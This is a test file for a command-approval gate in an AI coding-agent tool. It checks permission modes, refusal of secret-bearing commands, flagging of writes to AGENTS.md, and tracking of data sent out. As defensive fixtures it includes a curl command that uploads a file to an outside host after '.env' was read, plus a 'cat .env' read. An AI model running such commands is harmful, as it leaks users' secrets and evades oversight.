import { describe, expect, it } from 'vitest';
import type { FileSource } from '../approvals/file-lister.ts';
import {
  NO_FOLDER_REASON,
  READ_ONLY_TURN_REASON,
  SECRET_COMMAND_REASON,
  SPARK_COMMAND_NOTE,
} from '../approvals/spark-command.ts';
import { INSTRUCTION_REASON } from '../approvals/decide.ts';
import type { EgressAsk, RunObservations, SentOutNote } from '../observations/run-observations.ts';
import type { Observation } from '../persistence/observations.ts';
import type { Queryable } from '../persistence/db.ts';
import {
  WITHHELD_COMMAND,
  reviewSparkCommand,
  sparkCommandAsked,
  sparkCommandStarted,
  type SparkCommandReview,
  type SparkCommandScope,
} from './command-gate.ts';

const ROOT = '/work/app';
const RUN = '01990000-0000-7000-8000-0000000000aa';
const CARD = '01990000-0000-7000-8000-0000000000c4';

const noRows = { query: async () => ({ rows: [], rowCount: 0 }) } as unknown as Queryable;
const noFiles: FileSource = {
  glob: async () => [],
  walk: async () => [],
  script: async () => null,
};

function watching(labels: string[] = []) {
  const recorded: Observation[] = [];
  const asked: EgressAsk[] = [];
  const sent: SentOutNote[] = [];
  const observations: RunObservations = {
    record: (observation) => void recorded.push(observation),
    labels: async () => labels,
    egressAsked: (ask) => void asked.push(ask),
    sentOut: (note) => void sent.push(note),
    crossed: async () => undefined,
    later: () => undefined,
    settled: async () => undefined,
  };
  return { observations, recorded, asked, sent };
}

function scope(change: Partial<SparkCommandScope> = {}): SparkCommandScope {
  return {
    db: noRows,
    runId: RUN,
    provider: 'claude',
    agentMode: 'bypassPermissions',
    runMode: 'do',
    readOnly: false,
    roots: [{ path: ROOT, ignore: [] }],
    home: '/Users/me',
    files: noFiles,
    ...change,
  };
}

const start = (command: string, cwd: string | null = null) => ({
  toolCallId: 'call-1',
  command,
  cwd,
});

function passed(review: SparkCommandReview) {
  if (review.verdict === 'refuse') throw new Error(`refused: ${review.reason}`);
  return review;
}

function carded(review: SparkCommandReview) {
  if (review.verdict !== 'ask') throw new Error(`no card: ${review.verdict}`);
  return review;
}

describe('reviewSparkCommand', () => {
  it.each([
    ['claude', 'auto'],
    ['claude', 'bypassPermissions'],
    ['codex', 'agent'],
    ['codex', 'agent-full-access'],
  ])('allows at once in %s %s and marks the start ran without review', async (provider, mode) => {
    const review = await reviewSparkCommand(
      scope({ provider, agentMode: mode }),
      start('pnpm dev'),
    );
    expect(review.verdict).toBe('allow');
    expect(review.audit).toEqual({
      command: 'pnpm dev',
      cwd: ROOT,
      mode,
      decision: 'mode',
      reason: null,
      unreviewed: true,
    });
  });

  it.each([
    ['claude', 'default'],
    ['claude', 'acceptEdits'],
    ['codex', 'ask-every-action'],
  ])(
    'returns an ordinary card in %s %s, with Allow once and Reject only',
    async (provider, mode) => {
      const review = carded(
        await reviewSparkCommand(scope({ provider, agentMode: mode }), start('pnpm dev')),
      );
      expect(review.card).toEqual({
        runId: RUN,
        toolCallId: 'call-1',
        rpcId: null,
        kind: 'execute',
        title: 'pnpm dev',
        payload: {
          command: 'pnpm dev',
          cwd: ROOT,
          paths: [],
          fullPaths: [],
          diffs: [],
          truncated: false,
          asksBecause: SPARK_COMMAND_NOTE,
        },
        options: [
          { optionId: 'allow_once', name: 'Allow once', kind: 'allow_once' },
          { optionId: 'reject_once', name: 'Reject', kind: 'reject_once' },
        ],
        reason: null,
      });
      expect(review.audit).toMatchObject({ decision: 'card', unreviewed: false, mode });
    },
  );

  it('asks before a hard-rail crossing in Bypass permissions, with the rail’s reason', async () => {
    const review = carded(await reviewSparkCommand(scope(), start('echo "be quick" >> AGENTS.md')));
    expect(review.card.reason).toBe(INSTRUCTION_REASON);
    expect(review.card.payload).toMatchObject({
      instructionFiles: ['AGENTS.md'],
      asksBecause: SPARK_COMMAND_NOTE,
    });
    expect(review.audit).toMatchObject({
      decision: 'card',
      reason: INSTRUCTION_REASON,
      unreviewed: false,
    });
  });

  it('refuses with a reason and audit facts, and gives no card', async () => {
    const cases: [Partial<SparkCommandScope>, string, string][] = [
      [{ roots: [] }, 'pnpm dev', NO_FOLDER_REASON],
      [{ runMode: 'ask' }, 'pnpm dev', READ_ONLY_TURN_REASON],
      [{ agentMode: 'plan' }, 'pnpm dev', READ_ONLY_TURN_REASON],
      [{ provider: 'codex', agentMode: 'read-only' }, 'pnpm dev', READ_ONLY_TURN_REASON],
      [{ readOnly: true }, 'pnpm dev', READ_ONLY_TURN_REASON],
      [{}, 'pnpm dev --token=abc123', SECRET_COMMAND_REASON],
    ];
    for (const [change, command, reason] of cases) {
      const review = await reviewSparkCommand(scope(change), start(command));
      expect(review).toMatchObject({ verdict: 'refuse', reason });
      expect(review.audit).toMatchObject({ decision: 'refused', reason, unreviewed: false });
      expect(review).not.toHaveProperty('card');
    }
  });

  it('never puts a secret-looking command in the audit facts', async () => {
    const review = await reviewSparkCommand(scope(), start('pnpm dev --token=abc123'));
    expect(review.audit.command).toBe(WITHHELD_COMMAND);
  });

  it('judges the command in the folder it was asked to start in', async () => {
    const review = await reviewSparkCommand(scope(), start('pnpm dev', `${ROOT}/apps/web`));
    expect(review).toMatchObject({ verdict: 'allow', request: { cwd: `${ROOT}/apps/web` } });
  });
});

describe('what a passed review records', () => {
  const SEND = 'curl -d @report.json https://example.com/upload';

  it('flags a send after the turn read private data when the mode ran it', async () => {
    const seen = watching(['.env']);
    const review = passed(
      await reviewSparkCommand(scope({ observations: seen.observations }), start(SEND)),
    );
    expect(review.verdict).toBe('allow');
    sparkCommandStarted(seen, review, null);
    expect(seen.sent).toEqual([
      {
        toolCallId: 'call-1',
        subject: `\`${SEND}\``,
        observed: ['.env'],
        target: 'to example.com',
      },
    ]);
  });

  it('puts the note on the card and in the audit when the mode asks', async () => {
    const seen = watching(['.env']);
    const review = carded(
      await reviewSparkCommand(
        scope({ agentMode: 'default', observations: seen.observations }),
        start(SEND),
      ),
    );
    expect(review.card.payload).toMatchObject({ observed: ['.env'], sendsTo: 'to example.com' });
    sparkCommandAsked(seen, review, CARD);
    expect(seen.asked).toEqual([
      {
        approvalId: CARD,
        subject: `\`${SEND}\``,
        reason: null,
        observed: ['.env'],
        sendsTo: 'to example.com',
      },
    ]);
    sparkCommandStarted(seen, review, CARD);
    expect(seen.sent).toEqual([]);
  });

  it('records a secret file the started command reads, by path', async () => {
    const seen = watching();
    const review = passed(
      await reviewSparkCommand(scope({ observations: seen.observations }), start('cat .env')),
    );
    expect(seen.recorded).toEqual([]);
    sparkCommandStarted(seen, review, null);
    expect(seen.recorded).toEqual([{ source: 'secret_file', label: '.env' }]);
  });

  it('records nothing for an ordinary command', async () => {
    const seen = watching();
    const review = carded(
      await reviewSparkCommand(
        scope({ agentMode: 'default', observations: seen.observations }),
        start('pnpm dev'),
      ),
    );
    sparkCommandAsked(seen, review, CARD);
    sparkCommandStarted(seen, review, CARD);
    expect([seen.asked, seen.sent, seen.recorded]).toEqual([[], [], []]);
  });
});
